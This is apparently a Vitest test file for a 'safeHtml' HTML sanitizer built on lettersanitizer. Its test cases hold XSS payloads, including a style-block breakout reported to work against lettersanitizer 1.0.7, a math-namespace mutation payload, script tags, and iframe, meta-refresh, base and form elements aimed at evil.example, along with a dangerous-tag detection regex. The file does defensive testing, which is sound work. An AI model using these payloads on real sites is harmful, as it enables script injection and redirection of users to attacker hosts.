// @vitest-environment jsdom
import { describe, test, expect } from 'vitest'
import { sanitize } from 'lettersanitizer'
import { safeHtml } from '@shared-ui/utils/safeHtml.js'

// The payload confirmed against lettersanitizer 1.0.7 in Chromium: the CSS escape becomes a
// literal </style> when the sanitizer rebuilds the style block.
const BREAKOUT = '<style>p{font-family:"\\3C/style\\3E\\3Cimg src=x onerror=alert(1)\\3E"}</style><p>hi</p>'

const tags = (html) => (html.match(/<\s*(style|script|svg|math|iframe|object|embed|link|meta|base|form)\b/gi) || []).map((t) => t.toLowerCase())

describe('safeHtml', () => {
  // That lettersanitizer alone lets the breakout run is proven in a real browser
  // (scripts/security-smoke/sanitizer.mjs): jsdom has no CSSOM for it to rebuild from.

  test.each([
    ['the confirmed breakout', BREAKOUT],
    ['style in head', '<html><head><style>a{color:red}</style></head><body><p>x</p></body></html>'],
    ['uppercase', '<STYLE>p{}</STYLE><p>x</p>'],
    ['nested in a table', '<table><tr><td><style>p{}</style>x</td></tr></table>'],
    ['svg style', '<svg><style>p{}</style></svg><p>x</p>'],
    ['math namespace confusion', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
    ['script', '<p>x</p><script>alert(1)</script>'],
    ['iframe and object', '<iframe src="https://evil.example"></iframe><object data="x"></object>'],
    ['link and meta refresh', '<link rel=stylesheet href=//evil.example/x.css><meta http-equiv=refresh content="0;url=//evil.example">'],
    ['base and form', '<base href="https://evil.example/"><form action="https://evil.example"><input name=p></form>']
  ])('removes the dangerous elements: %s', (_, html) => {
    const out = safeHtml(html)
    expect(tags(out)).toEqual([])
    // and lettersanitizer, parsing it again, finds none either
    expect(tags(sanitize(out, '', {}))).toEqual([])
  })

  test('keeps ordinary message HTML', () => {
    const html = '<p>Xin <b>chào</b> <a href="https://vetgo.tech">VetGo</a></p><img src="https://cdn.example/a.png">'
    expect(safeHtml(html)).toBe(html)
  })

  test('leaves text without tags and empty values alone', () => {
    expect(safeHtml('a < b')).toBe('a &lt; b')
    expect(safeHtml('plain text')).toBe('plain text')
    expect(safeHtml('')).toBe('')
    expect(safeHtml(null)).toBe('')
  })
})
